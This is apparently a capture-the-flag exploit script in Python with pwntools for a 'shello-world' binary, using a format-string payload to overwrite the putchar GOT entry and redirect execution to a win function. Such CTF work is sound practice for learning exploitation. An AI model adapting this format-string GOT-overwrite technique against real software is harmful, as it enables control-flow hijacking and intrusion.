#!/usr/bin/env python3

from pwn import *

elf = ELF("./shello-world.elf")

# s  = remote("challs.tfcctf.com", 31062)
s = process(elf.path)

def main():

	putchar_plt = 0x401036
	win_plt = 0x0000401176
	putchar_got = elf.got.putchar

	pl = flat({
		0x00:	"%{}c%14$hhn%{}c%15$hhn".format(
					0x11,
					0x76 - 0x11
				).encode(),
		
		0x40:	p64(putchar_got+1),
		0x48:	p64(putchar_got)
	})

	# pl = "%7$p<---" + p64(0xdeadface)
	s.send(pl.ljust(255))
	s.interactive()

if __name__=="__main__":
	main()